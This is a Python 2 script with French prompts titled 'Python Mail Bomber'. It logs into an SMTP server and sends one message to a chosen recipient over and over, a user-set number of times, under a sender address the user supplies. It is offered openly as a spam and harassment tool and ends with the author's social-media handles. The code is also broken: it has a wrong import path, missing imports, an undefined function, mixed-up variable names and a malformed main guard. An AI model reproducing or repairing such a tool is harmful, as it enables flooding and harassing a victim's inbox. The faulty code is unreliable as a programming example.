"""
    Copyright : Mahid
    Year : 2018
    Code your freedom.
"""
import smtplib
import mimetypes
from email.MIMETEXT import MIMETEXT

class SMTP(object):
    
    def title(self):
        print("TITRE : PYTHON MAIL BOMBER ")
    
    def SMTPconnect(self):
        print("SMTPconnect()")
        self.smtpserver = raw_input("\nEntrez le nom du serveur SMTP : ")
        self.smtpport = input("Entrez le numéro du port : ")

        try:
            self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)
        except IOError, e:
            print('ERREUR : %s%' %(e))
            time.sleep(5)
            sys.exit(1)
        self.mailServer.starttls()
        self.username = raw_input("\nEntrez le nom d'utilisateur : ")
        self.password = raw_input("\nEntrez le mot de passe : ")
        try:
            self.mailServer.login(self.username, self.password)
        except BaseException, e:
            print("ERREUR : %s" %(e))
            time.sleep(3)
            sys.exit(1)
    
    def buildemail(self):
        print(buildmail())
        self.From = raw_input("\nDe : ")
        self.To = raw_input("\nA : ")
        self.Subject = raw_input("\nSujet : ")
        self.Message = raw_input("\nVotre message : ")

        mensje = MIMETEXT(self.Message)
        mensaje['From'] = self.From
        mensaje['To'] = self.To
        mensaje['Subject'] = self.Subject
        self.ammount = input("Numéro Spam : ")
        x = 0
        while x < self.ammount:
            self.mailServer.sendmail(self.From, self.To, mensaje.as_string())
            x+=1
        print("Envoyé ")
        time.sleep(10)
        print("Le message a été envoyé :) ")
        print("Suivez moi sur twitter @mahid_hm, youtube Henrique Mukanda, github Mahi2")

if __name__ == "__main" :
    s = SMTP()
    s.title()
    s.SMTPconnect()
    s.buildemail()

    
    